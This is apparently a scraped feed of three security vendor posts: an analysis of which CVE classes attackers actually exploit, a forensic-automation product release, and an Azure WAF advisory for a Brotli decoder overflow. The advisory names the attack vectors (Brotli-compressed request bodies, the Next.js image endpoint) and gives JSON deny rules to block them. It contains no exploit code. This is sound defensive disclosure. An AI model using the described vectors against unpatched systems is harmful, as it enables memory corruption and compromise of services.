The subset of vulnerabilities exploited in the wild is much smaller than the overall CVE population, and looks very different from it. Fewer than 1 in 200 published CVEs are ever used in a real attack, and those that do get used are overwhelmingly concentrated in the takeover classes that maximize threat actor impact and exposure.

The difference becomes clear when we look at impact. Exploitation is heavily concentrated in vulnerabilities that give attackers greater control over a system. Server-side RCE rises from 20% of published CVEs to 37% of exploited CVEs, local privilege escalation from 11% to 18%, and client-side RCE from 4% to 13%. By comparison, XSS falls from 15% to 4% and denial of service from 16% to 7%. OS vulnerabilities show a similar shift, increasing from 23% of the overall CVE population to 41% of exploited vulnerabilities.

These patterns are consistent with threat actors favoring vulnerabilities that can provide meaningful access and control. Remote code execution and privilege escalation can create footholds that support subsequent stages of an attack, while vulnerabilities that primarily cause a crash or limited script execution may offer less utility for broader compromise.

Importantly, a vulnerability’s stated classification does not always reflect what an attacker can reliably achieve in practice. For example, some vulnerabilities described as enabling RCE may ultimately result only in denial of service under real-world conditions. Understanding the demonstrated impact and exploitability of a vulnerability is therefore critical to effective prioritization.

Figure 2 – The 2,056 exploited-in-the-wild CVEs distribution, compared against the full published population: ghost lines mark each class and platform’s share of all ~380K published CVEs, and badges show the shift in percentage points. Takeover classes and OS code rise, while high-volume XSS and DoS fall. Where defenders should focus Patching is slow, while exploitation is fast

Patching is slow, and far slower on critical systems than others. Across platforms, servers are the critical assets and the slowest to patch. Microsoft Security Exposure Management data from 2026 shows that the median vulnerability is patched in about two weeks on Windows workstations but in more than a month on Windows Servers. It stretches to 10+ weeks on Linux Servers and for applications running on MacOS, and beyond a year on network appliances. That gap is the threat actor’s window, widest on the critical systems that stay exposed the longest.

Exploitation runs on the opposite clock: the most impactful vulnerabilities are weaponized in days, increasingly on or before disclosure. According to VulnCheck, 29% of the exploits in 2025 were launched within 1 day of CVE publication. According to CISA, the mean time from CVE publication to CISA KEV catalog fell from 89 days in 2024 to 57 days in 2025. 2026 data up to September already have that number dropping to 20 days, with a median of only 3 days since publication. Industry research suggests that advances in AI are a significant factor in the time reduction required to develop exploits, further increasing pressure on defenders to respond quickly.

Impact, exposure and where to focus

Two things determine a vulnerability’s value to a threat actor: impact and exposure. Impact is what successful exploitation provides, such as remote code execution or privilege escalation. Exposure is an asset’s position in the environment and the opportunities it creates for further compromise. An asset’s exposure is shaped by the identities, privileges, and connections available from it.

Servers often use service accounts, application identities, or cloud-managed identities with permissions beyond their operational needs. Compromising such a system can provide access to additional resources, sensitive data, administrative privileges, or trusted network paths. Together, impact and exposure determine the blast radius: a vulnerability that enables full control of a highly exposed system can enable widespread on-premises or cloud compromise.

Threat actors do not exploit at random: they go after the vulnerabilities that give the highest impact and exposure: full control of a system and the privileged identities and critical assets it has access to. As defenders, focusing on these vulnerabilities first can deliver the highest return on remediation investment.

Takeover vulnerabilities like remote code execution, authentication bypass and local privilege escalation lead here. They drive the broadest exposure and the largest blast radius, account for 78% of real-world exploited vulnerabilities, and stopping their exploitation interrupts attacks at the earliest stage, before compromise can propagate across the environment.

Next in line

A second slice deserves attention where context makes it severe: denial of service against availability-critical assets is recoverable in general, but can be mission-ending in parts of your environment where uptime is everything; disclosure of credentials or secrets can be minor as an insulated incident, but it feeds the same privileged-identity path mentioned above.

Figure 3 – The three remote-takeover classes analyzed across 1,239 exploited CVEs), each drilled down by affected platform and split into OS vs Application code. Bar length is the CVE count per platform; the dark segment is OS/system, the light segment is application. How Microsoft Security helps defenders act

Threat actors do not begin with a vulnerability list. They begin by looking for a reachable way in. Microsoft Defender External Attack Surface Management approaches the environment from that same outside-in perspective, continuously discovering internet-facing infrastructure, including previously unknown or unmonitored assets, shadow IT, and third-party dependencies. This gives defenders an opportunity to remove unnecessary exposure before a reachable vulnerability becomes an entry point.

Once the reachable assets are known, the next question is which weaknesses deserve immediate attention. Defenders need a way to prioritize exposure beyond CVSS alone. Microsoft Defender Vulnerability Management addresses this challenge through Exposure Score and prioritized security recommendations.

Prioritization incorporates threat and exploitability signals, breach likelihood, internet exposure, and asset criticality, helping teams focus remediation on vulnerabilities that create the greatest actual exposure.

An initial foothold is only part of the risk. Attack Path Analysis connects assets and threat actor techniques into end-to-end routes from an entry point to a critical asset. Microsoft Security Exposure Management Attack Path Analysis provides a cross-workload view spanning endpoints, cloud, and hybrid environments, using vulnerability context from MDVM, endpoint data from Defender for Endpoint, and cloud asset data from Defender for Cloud. Within cloud environments, Defender CSPM Attack Path Analysis adds detailed context about internet exposure, vulnerabilities, network connections, identities, and permissions across Azure, AWS, and Google Cloud.

Together, these experiences show how an exposed workload could become a path through a privileged identity to sensitive data or another critical resource, helping defenders identify where to break the path before the initial compromise expands.

Patching remains essential, but it is not the only defensive action available. Microsoft Security helps defenders discover the doors threat actors can see, prioritize the weaknesses they are most likely to exploit, understand where a compromise could lead, and identify opportunities to break attack paths before compromise spreads to critical assets.

items.title: Scale your forensic workflows with Magnet Automate 5.2
items.summary: Connect tools, reduce manual intervention, and move evidence through your investigation workflow more efficiently. Key takeaways Magnet Automate helps teams turn repetitive forensic processes into standardized, repeatable workflows, reducing the manual effort required to move evidence from acquisition through processing, analysis, and reporting. Automate 5.2 adds GID integration, more flexible workflow starting options, and expanded Remote Acquire capabilities, helping teams connect the tools and intelligence they already use. Expanded Local DateTime support and improvements across APIs, PowerShell handling, watch-folder processing, licensing, and telemetry help teams build more flexible and dependable forensic workflows as case volumes grow. For many teams, their work still involves starting processes manually, moving between tools, monitoring jobs, and repeating the same steps across investigations. As case volume grows, those handoffs can become an operational bottleneck. That’s where forensic automation can help. Magnet Automate orchestrates repeatable workflows across both Magnet and third-party forensic tools, helping teams reduce manual intervention, standardize processes, and keep evidence moving through their existing forensic environment. With Magnet Automate 5.2, teams can take that automation further, with new capabilities for incorporating GID intelligence, initiating workflows, Remote Acquire, Local DateTime, and workflow reliability. From forensic analysis to forensic operations Magnet Axiom gives examiners the environment to process and analyze digital evidence. As teams scale, however, the question can shift from “How do I process this case?” to “How do we consistently move many cases through our forensic processes?” Magnet Automate extends that environment by orchestrating workflows around the forensic tools and processes teams already use, helping them scale operations without replacing their existing forensic toolkit. Put more intelligence into repeatable workflows Automation becomes more valuable when it can connect the intelligence and forensic technologies your team already relies on. With Automate 5.2, GID can now be incorporated into automated workflows through Automate, Process CLI, and GID Manager/Client services. Once configured, teams can identify GID hash sets for use in a Process CLI search, helping improve processing performance compared with local hash lists. For teams already using GID, this means that intelligence can become part of a repeatable processing workflow rather than a separate investigative step. Remember to also use your Export Templates to refine the export further going into Griffeye, by removing categories you do not need in the Griffeye case. Build workflows around the process you need Not every workflow starts with an image or a drive. Automate 5.2 adds an “Other” start element to give teams greater flexibility over how their workflows begin. That means teams can spend less time accommodating the mechanics of the workflow and more time designing workflows around the processes they actually need to automate. This enhancement complements Automate’s existing visual workflow approach, which allows teams to build and reuse workflows across their forensic processes. Connect collection more closely to downstream forensic workflows Collecting evidence is only the beginning of an investigation. The more teams can connect acquisition to the processes that follow, the less manual intervention is required to keep evidence moving. Automate 5.2 expands the flexibility of Remote Acquire workflows, enabling teams to build more complex workflows without the previous PowerShell script-length constraint. It also provides additional flexibility when initiating workflows through the API and working with node IP configurations. Previously, Remote Acquire workflows could encounter PowerShell’s 32,767-character script limit. Automate 5.2 addresses this by temporarily writing the JSON, passing it to Remote Acquire CLI, and removing it after the operation is complete. The release also includes changes that provide greater flexibility when starting a non-Remote Acquire workflow through the API and when working with node IP configurations. The outcome is that teams can build more complex Remote Acquire workflows without the previous PowerShell script-length constraint while gaining additional flexibility around how those workflows are initiated and configured. Preserve time context across automated workflows Automate 5.2 extends Local DateTime support into Post Processing/RunJob and Exporter workflows, helping teams carry that time context further through automated processing and export. For teams working with evidence across systems or locations, this provides greater flexibility for maintaining relevant time context as evidence moves through the workflow. Improved reliability for everyday workflows Automate 5.2 also includes a range of improvements across licensing, APIs, PowerShell handling, watch-folder processing, and telemetry. Together, these updates are designed to reduce friction and improve reliability across automated workflows. For the full technical details, see the Automate 5.2 release notes . Is it time to automate more of your forensic workflow? Automate may be worth considering if your team: Repeats the same processing steps across investigations Spends examiner time starting, monitoring, or moving work between forensic tools Needs more consistent workflows across investigators or cases Uses multiple Magnet or third-party forensic technologies as part of the same process Is looking to scale forensic operations without adding the same level of manual process overhead If you’re already using Magnet Axiom, Axiom Cyber, or other technologies within your forensic workflow, Automate can help connect those individual capabilities into standardized processes. Ready to automate more of your forensic workflow? As forensic operations scale, the opportunity isn’t simply to process evidence faster. It’s to reduce the manual work required to keep evidence moving. Magnet Automate helps teams turn forensic processes into repeatable workflows and Automate 5.2 gives teams even more flexibility over the intelligence, acquisition, and processes they can bring into those workflows. New to Automate? See how Magnet Automate works Already using Automate? Explore what’s new in Automate 5.2

Connect tools, reduce manual intervention, and move evidence through your investigation workflow more efficiently.

Key takeaways
  • Magnet Automate helps teams turn repetitive forensic processes into standardized, repeatable workflows, reducing the manual effort required to move evidence from acquisition through processing, analysis, and reporting.
  • Automate 5.2 adds GID integration, more flexible workflow starting options, and expanded Remote Acquire capabilities, helping teams connect the tools and intelligence they already use.
  • Expanded Local DateTime support and improvements across APIs, PowerShell handling, watch-folder processing, licensing, and telemetry help teams build more flexible and dependable forensic workflows as case volumes grow.

For many teams, their work still involves starting processes manually, moving between tools, monitoring jobs, and repeating the same steps across investigations. As case volume grows, those handoffs can become an operational bottleneck.

That’s where forensic automation can help.

Magnet Automate orchestrates repeatable workflows across both Magnet and third-party forensic tools, helping teams reduce manual intervention, standardize processes, and keep evidence moving through their existing forensic environment.

With Magnet Automate 5.2, teams can take that automation further, with new capabilities for incorporating GID intelligence, initiating workflows, Remote Acquire, Local DateTime, and workflow reliability.

From forensic analysis to forensic operations

Magnet Axiom gives examiners the environment to process and analyze digital evidence. As teams scale, however, the question can shift from “How do I process this case?” to “How do we consistently move many cases through our forensic processes?”

Magnet Automate extends that environment by orchestrating workflows around the forensic tools and processes teams already use, helping them scale operations without replacing their existing forensic toolkit.

Put more intelligence into repeatable workflows

Automation becomes more valuable when it can connect the intelligence and forensic technologies your team already relies on.

With Automate 5.2, GID can now be incorporated into automated workflows through Automate, Process CLI, and GID Manager/Client services. Once configured, teams can identify GID hash sets for use in a Process CLI search, helping improve processing performance compared with local hash lists.

For teams already using GID, this means that intelligence can become part of a repeatable processing workflow rather than a separate investigative step. Remember to also use your Export Templates to refine the export further going into Griffeye, by removing categories you do not need in the Griffeye case.

Build workflows around the process you need

Not every workflow starts with an image or a drive. Automate 5.2 adds an “Other” start element to give teams greater flexibility over how their workflows begin.

That means teams can spend less time accommodating the mechanics of the workflow and more time designing workflows around the processes they actually need to automate.

This enhancement complements Automate’s existing visual workflow approach, which allows teams to build and reuse workflows across their forensic processes.

Connect collection more closely to downstream forensic workflows

Collecting evidence is only the beginning of an investigation. The more teams can connect acquisition to the processes that follow, the less manual intervention is required to keep evidence moving.

Automate 5.2 expands the flexibility of Remote Acquire workflows, enabling teams to build more complex workflows without the previous PowerShell script-length constraint. It also provides additional flexibility when initiating workflows through the API and working with node IP configurations.

Previously, Remote Acquire workflows could encounter PowerShell’s 32,767-character script limit. Automate 5.2 addresses this by temporarily writing the JSON, passing it to Remote Acquire CLI, and removing it after the operation is complete.

The release also includes changes that provide greater flexibility when starting a non-Remote Acquire workflow through the API and when working with node IP configurations.

The outcome is that teams can build more complex Remote Acquire workflows without the previous PowerShell script-length constraint while gaining additional flexibility around how those workflows are initiated and configured.

Preserve time context across automated workflows

Automate 5.2 extends Local DateTime support into Post Processing/RunJob and Exporter workflows, helping teams carry that time context further through automated processing and export.

For teams working with evidence across systems or locations, this provides greater flexibility for maintaining relevant time context as evidence moves through the workflow.

Improved reliability for everyday workflows

Automate 5.2 also includes a range of improvements across licensing, APIs, PowerShell handling, watch-folder processing, and telemetry. Together, these updates are designed to reduce friction and improve reliability across automated workflows.

For the full technical details, see the Automate 5.2 release notes.

Is it time to automate more of your forensic workflow?

Automate may be worth considering if your team:

  • Repeats the same processing steps across investigations
  • Spends examiner time starting, monitoring, or moving work between forensic tools
  • Needs more consistent workflows across investigators or cases
  • Uses multiple Magnet or third-party forensic technologies as part of the same process
  • Is looking to scale forensic operations without adding the same level of manual process overhead

If you’re already using Magnet Axiom, Axiom Cyber, or other technologies within your forensic workflow, Automate can help connect those individual capabilities into standardized processes.

Ready to automate more of your forensic workflow?

As forensic operations scale, the opportunity isn’t simply to process evidence faster. It’s to reduce the manual work required to keep evidence moving.

Magnet Automate helps teams turn forensic processes into repeatable workflows and Automate 5.2 gives teams even more flexibility over the intelligence, acquisition, and processes they can bring into those workflows.

items.title: Protect against Brotli CVE-2026-111497 with Azure Web Application Firewall (WAF)
items.summary: Google Brotli versions 1.0.3 through 1.2.0 contain a buffer overflow vulnerability in the Brotli decoder, according to the recently published CVE-2026-111497 . A remote, unauthenticated attacker can send a crafted Brotli-compressed stream to corrupt decoder memory, expose sensitive memory contents, cause a denial of service, or potentially run arbitrary code. Any application that decompresses untrusted Brotli data may be affected. This includes Node.js and Python applications that bundle the vulnerable decoder, and services that accept request bodies with the Content-Encoding: br header. We strongly recommend upgrading Brotli to a patched version: 1.0.10, 1.1.1 or 1.2.1 ( Brotli releases ). If you use Node.js, upgrade to 22.23.4, 24.22.1 or 26.12.1 ( Node.js security release ). If you can't patch your applications right away, Azure WAF on Application Gateway, Application Gateway for Containers and Azure Front Door can help mitigate the inbound attack vector, which is Brotli-compressed request bodies sent to your application. Note: Azure WAF inspects only inbound requests to your application. It can't protect applications that fetch and decompress Brotli-encoded responses from external servers. Those applications must be patched. Bu ilt- in protectio n enabled by default If you use Azure WAF with DRS 2.2 on Application Gateway or Azure Front Door Premium, you're protected by default against crafted Brotli-compressed request bodies. Rule 920450 (Paranoia Level 1, enabled by default) checks requests against a list of restricted headers, and DRS 2.2 adds Content-Encoding to that list. The rule has a critical anomaly score, so a single match blocks the request when the WAF policy is in Prevention mode. Earlier rule set versions don't restrict the Content-Encoding header. If you're still on DRS 2.1, CRS 3.2 or earlier, we recommend upgrading to DRS 2.2 to get the latest protection. To learn how, see Upgrade CRS or DRS ruleset version. If your application uses Next.js image optimization, apply the BlockNextImageCVE2026111497 custom rule below, even if you're on DRS 2.2. Cust om rules to mitigate CVE-2026-111497 The custom rules block two attack vectors: 1. CVE2026111497 blocks any request whose Content-Encoding header includes the br (Brotli) coding, which this attack uses. DRS 2.2 already covers this vector through rule 920450. We recommend this rule for: WAF policies still on DRS 2.1 or earlier, while you plan the upgrade. WAF policies where rule 920450 is disabled or overridden. Azure Front Door Standard, which supports custom rules only. Managed rule sets require Azure Front Door Premium. WAF policies attached to Azure Application Gateway for Containers. 2. BlockNextImageCVE2026111497 blocks any request to the Next.js image optimization endpoint, including under a base path. It URL-decodes and lowercases the request URI first, so encoded or mixed-case variants are also blocked. No managed rule set covers this vector. We recommend this rule for all WAF policies that protect Next.js applications, whatever rule set version they use. These rules may also block legitimate traffic. The first may block clients sending Brotli-compressed request bodies. The second blocks every image served through Next.js image optimization (for example, by the image component), so those images won't load. If you aren't sure whether your application relies on either, set the action to 'Log traffic only' first, and review your WAF logs before switching to 'Deny traffic'. You can remove the Content-Encoding rule once your applications are patched or your policy uses DRS 2.2. Keep the Next.js image optimization rule until your applications are patched. Azure WAF on Application Gateway and Application Gateway for Containers If you are using CRS 3.0 or CRS 3.1, upgrade your ruleset version to a later version first, then apply the custom rule. { "name": "CVE2026111497", "priority": 100, "ruleType": "MatchRule", "action": "Block", "matchConditions": [ { "matchVariables": [ { "variableName": "RequestHeaders", "selector": "Content-Encoding" } ], "operator": "Regex", "matchValues": [ "(?:^|,)[ \\t]*br[ \\t]*(?:,|$)" ], "transforms": [ "Lowercase" ] } ] } { "name": "BlockNextImageCVE2026111497", "priority": 90, "ruleType": "MatchRule", "action": "Block", "state": "Enabled", "matchConditions": [ { "matchVariables": [{"variableName": "RequestUri"}], "operator": "Regex", "negationConditon": false, "matchValues": ["^(?:https?://[^/?#]+)?/(?:[^?#]*/)?_next/image/?(?:\\?|$)"], "transforms": ["UrlDecode", "Lowercase"] } ] } Azure WAF on Azure Front Door { "name": "CVE2026111497", "priority": 120, "enabledState": "Enabled", "ruleType": "MatchRule", "action": "Block", "matchConditions": [ { "matchVariable": "RequestHeader", "selector": "Content-Encoding", "operator": "RegEx", "negateCondition": false, "transforms": [ "Lowercase" ], "matchValue": [ "(?:^|,)[ \\t]*br[ \\t]*(?:,|$)" ] } ] } { "name": "BlockNextImageCVE2026111497", "priority": 90, "ruleType": "MatchRule", "action": "Block", "enabledState": "Enabled", "matchConditions": [ { "matchVariable": "RequestUri", "operator": "RegEx", "negateCondition": false, "matchValue": ["^(?:https?://[^/?#]+)?/(?:[^?#]*/)?_next/image/?(?:\\?|$)"], "transforms": ["UrlDecode", "Lowercase"] } ] } Restrict request size The proof-of-concept payloads analyzed so far are about 23 MB each. Attackers may be able to craft smaller payloads, so treat size limits as an extra layer of protection, not a mitigation on their own. Whatever rule set version you use, we recommend the following: Azure WAF on Application Gateway and Application Gateway for Containers The proof-of-concept payloads are well above the default maximum request body size of 128 KB on Application Gateway and Application Gateway for Containers. We recommend setting the maximum request body size in your WAF policy to the smallest value your application needs. Learn more . Azure WAF on Azure Front Door To limit request body size, create a custom rule with a size constraint. For request body checks, the size is measured on the decoded body. Set the limit to the smallest value your application needs and make sure request body inspection is enabled in your WAF policy settings. The following example blocks request bodies larger than 40 KB. This rule supports limits of up to 128 KB. { "name": "BlockLargeRequestBody", "priority": 130, "enabledState": "Enabled", "ruleType": "MatchRule", "action": "Block", "matchConditions": [ { "matchVariable": "RequestBody", "operator": "GreaterThan", "negateCondition": false, "matchValue": [ "40960" ] } ] } You can find more information about custom rules on Azure WAF for Application Gateway or for Azure Front Door . Changelog 11/2 9:00 AM PST - Updated with additional custom rules
items.summary_html:
Google Brotli versions 1.0.3 through 1.2.0 contain a buffer overflow vulnerability in the Brotli decoder, according to the recently published CVE-2026-111497. A remote, unauthenticated attacker can send a crafted Brotli-compressed stream to corrupt decoder memory, expose sensitive memory contents, cause a denial of service, or potentially run arbitrary code. Any application that decompresses untrusted Brotli data may be affected. This includes Node.js and Python applications that bundle the vulnerable decoder, and services that accept request bodies with the Content-Encoding: br header. 

We strongly recommend upgrading Brotli to a patched version: 1.0.10, 1.1.1 or 1.2.1 (Brotli releases). If you use Node.js, upgrade to 22.23.4, 24.22.1 or 26.12.1 (Node.js security release). 

If you can't patch your applications right away, Azure WAF on Application Gateway, Application Gateway for Containers and Azure Front Door can help mitigate the inbound attack vector, which is Brotli-compressed request bodies sent to your application. 

Note: Azure WAF inspects only inbound requests to your application. It can't protect applications that fetch and decompress Brotli-encoded responses from external servers. Those applications must be patched. 

Built-in protection enabled by default

If you use Azure WAF with DRS 2.2 on Application Gateway or Azure Front Door Premium, you're protected by default against crafted Brotli-compressed request bodies. Rule 920450 (Paranoia Level 1, enabled by default) checks requests against a list of restricted headers, and DRS 2.2 adds Content-Encoding to that list. The rule has a critical anomaly score, so a single match blocks the request when the WAF policy is in Prevention mode. Earlier rule set versions don't restrict the Content-Encoding header. If you're still on DRS 2.1, CRS 3.2 or earlier, we recommend upgrading to DRS 2.2 to get the latest protection. To learn how, see Upgrade CRS or DRS ruleset version. 

If your application uses Next.js image optimization, apply the BlockNextImageCVE2026111497 custom rule below, even if you're on DRS 2.2.

Custom rules to mitigate CVE-2026-111497 

The custom rules block two attack vectors:

1. CVE2026111497 blocks any request whose Content-Encoding header includes the br (Brotli) coding, which this attack uses. DRS 2.2 already covers this vector through rule 920450. We recommend this rule for:

  • WAF policies still on DRS 2.1 or earlier, while you plan the upgrade.
  • WAF policies where rule 920450 is disabled or overridden.
  • Azure Front Door Standard, which supports custom rules only. Managed rule sets require Azure Front Door Premium.
  • WAF policies attached to Azure Application Gateway for Containers.

2. BlockNextImageCVE2026111497 blocks any request to the Next.js image optimization endpoint, including under a base path. It URL-decodes and lowercases the request URI first, so encoded or mixed-case variants are also blocked. No managed rule set covers this vector. We recommend this rule for all WAF policies that protect Next.js applications, whatever rule set version they use.

These rules may also block legitimate traffic. The first may block clients sending Brotli-compressed request bodies. The second blocks every image served through Next.js image optimization (for example, by the image component), so those images won't load. If you aren't sure whether your application relies on either, set the action to 'Log traffic only' first, and review your WAF logs before switching to 'Deny traffic'. You can remove the Content-Encoding rule once your applications are patched or your policy uses DRS 2.2. Keep the Next.js image optimization rule until your applications are patched.

Azure WAF on Application Gateway and Application Gateway for Containers

If you are using CRS 3.0 or CRS 3.1, upgrade your ruleset version to a later version first, then apply the custom rule. 

{ "name": "CVE2026111497", "priority": 100, "ruleType": "MatchRule", "action": "Block", "matchConditions": [ { "matchVariables": [ { "variableName": "RequestHeaders", "selector": "Content-Encoding" } ], "operator": "Regex", "matchValues": [ "(?:^|,)[ \\t]*br[ \\t]*(?:,|$)" ], "transforms": [ "Lowercase" ] } ] } { "name": "BlockNextImageCVE2026111497", "priority": 90, "ruleType": "MatchRule", "action": "Block", "state": "Enabled", "matchConditions": [ { "matchVariables": [{"variableName": "RequestUri"}], "operator": "Regex", "negationConditon": false, "matchValues": ["^(?:https?://[^/?#]+)?/(?:[^?#]*/)?_next/image/?(?:\\?|$)"], "transforms": ["UrlDecode", "Lowercase"] } ] } Azure WAF on Azure Front Door  { "name": "CVE2026111497", "priority": 120, "enabledState": "Enabled", "ruleType": "MatchRule", "action": "Block", "matchConditions": [ { "matchVariable": "RequestHeader", "selector": "Content-Encoding", "operator": "RegEx", "negateCondition": false, "transforms": [ "Lowercase" ], "matchValue": [ "(?:^|,)[ \\t]*br[ \\t]*(?:,|$)" ] } ] } { "name": "BlockNextImageCVE2026111497", "priority": 90, "ruleType": "MatchRule", "action": "Block", "enabledState": "Enabled", "matchConditions": [ { "matchVariable": "RequestUri", "operator": "RegEx", "negateCondition": false, "matchValue": ["^(?:https?://[^/?#]+)?/(?:[^?#]*/)?_next/image/?(?:\\?|$)"], "transforms": ["UrlDecode", "Lowercase"] } ] } Restrict request size 

The proof-of-concept payloads analyzed so far are about 23 MB each. Attackers may be able to craft smaller payloads, so treat size limits as an extra layer of protection, not a mitigation on their own. Whatever rule set version you use, we recommend the following: 

Azure WAF on Application Gateway and Application Gateway for Containers 

The proof-of-concept payloads are well above the default maximum request body size of 128 KB on Application Gateway and Application Gateway for Containers. We recommend setting the maximum request body size in your WAF policy to the smallest value your application needs. Learn more.  

Azure WAF on Azure Front Door 

To limit request body size, create a custom rule with a size constraint. For request body checks, the size is measured on the decoded body. Set the limit to the smallest value your application needs and make sure request body inspection is enabled in your WAF policy settings. 

The following example blocks request bodies larger than 40 KB. This rule supports limits of up to 128 KB. 

 

{ "name": "BlockLargeRequestBody", "priority": 130, "enabledState": "Enabled", "ruleType": "MatchRule", "action": "Block", "matchConditions": [ { "matchVariable": "RequestBody", "operator": "GreaterThan", "negateCondition": false, "matchValue": [ "40960" ] } ] }
